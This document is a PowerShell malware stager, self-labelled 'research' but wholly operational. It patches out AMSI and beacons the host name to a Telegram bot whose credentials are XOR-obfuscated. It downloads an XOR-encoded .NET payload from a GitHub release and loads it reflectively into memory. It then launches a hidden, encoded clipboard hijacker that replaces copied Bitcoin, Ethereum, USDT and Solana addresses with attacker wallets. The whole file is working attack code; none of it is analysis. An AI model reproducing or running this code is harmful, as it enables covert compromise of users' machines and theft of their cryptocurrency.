# --- [ELITE RESEARCH STAGER v30.6: BASE64-ONLY RAM INJECT] ---

# Disable AMSI using a memory-only flag patch
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

function Send-Ping {
    param($m)
    $k=0xAF; [byte[]]$t_e=60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118; [byte[]]$c_e=54,53,61,61,51,54,56,43,50,53
    $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}; $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
    $u = "h"+"tt"+"ps://api.tele"+"gram.org/bot$t/send"+"Message?chat_id=$c&text=$m"
    try { (New-Object Net.WebClient).DownloadString($u) | Out-Null } catch {}
}

Send-Ping -m "V30.6_GHOST_BOOT_$($env:COMPUTERNAME)"

try {
    # 1. Download the XOR data directly into a variable
    $url = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
    $raw = (New-Object Net.WebClient).DownloadString($url)

    # 2. Convert and XOR Decrypt in memory
    $data = [Convert]::FromBase64String($raw.Trim())
    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }

    # 3. Reflective Load (Secret RAM Install)
    # The assembly is loaded into the PowerShell process RAM space
    $Assembly = [System.Reflection.Assembly]::Load($data)
    
    # 4. Clipper Engine (As an Encoded Command to stay hidden)
    $C = @'
    Add-Type -AssemblyName System.Windows.Forms
    $w = @{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}
    while($true) {
        try {
            if ([System.Windows.Forms.Clipboard]::ContainsText()) {
                $v = [System.Windows.Forms.Clipboard]::GetText().Trim()
                if ($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$") { if ($v -ne $w.btc) { [System.Windows.Forms.Clipboard]::SetText($w.btc) } }
                elseif ($v -match "^0x[a-fA-F0-9]{40}$") { if ($v -ne $w.eth) { [System.Windows.Forms.Clipboard]::SetText($w.eth) } }
                elseif ($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$") { if ($v -ne $w.usdt) { [System.Windows.Forms.Clipboard]::SetText($w.usdt) } }
                elseif ($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$") { if ($v -ne $w.sol) { [System.Windows.Forms.Clipboard]::SetText($w.sol) } }
            }
        } catch {}
        Start-Sleep -m 500
    }
'@
    # Run the Clipper and the Loaded Assembly together
    $Assembly.EntryPoint.Invoke($null, @(,[string[]]@()))
    $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($C))
    powershell -NoP -W Hidden -EP Bypass -EncodedCommand $enc

    Send-Ping -m "V30.6_SUCCESS_IN_RAM"
} catch {
    Send-Ping -m "V30.6_FAIL: $($_.Exception.Message)"
}
